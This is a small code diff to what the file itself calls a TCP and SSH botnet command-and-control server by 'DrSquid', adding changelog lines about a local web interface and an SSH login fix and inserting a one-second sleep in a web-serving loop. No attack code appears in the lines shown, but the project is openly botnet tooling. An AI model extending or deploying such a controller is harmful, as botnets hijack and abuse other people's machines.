@@ -855,7 +855,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 
 [+] - Added Web-Interface(http://127.0.0.1:8080)!
 [+] - Fixed Variable bug in regular SSH Login Function(passw-->password)
-[+] - Optimized the code a little.
+[+] - Optimized the code.
+[+] - Fixed web-interface server slowing down Botnet.
 [+] - Fixed NotSamePassException Errors.
                     """)
                 if self.instruction != "!clear":
@@ -4885,6 +4886,7 @@ and many more.</h4>
 </body>
 </html>
                             """
+                time.sleep(1)
             except Exception as e:
                 pass
     def listen(self):
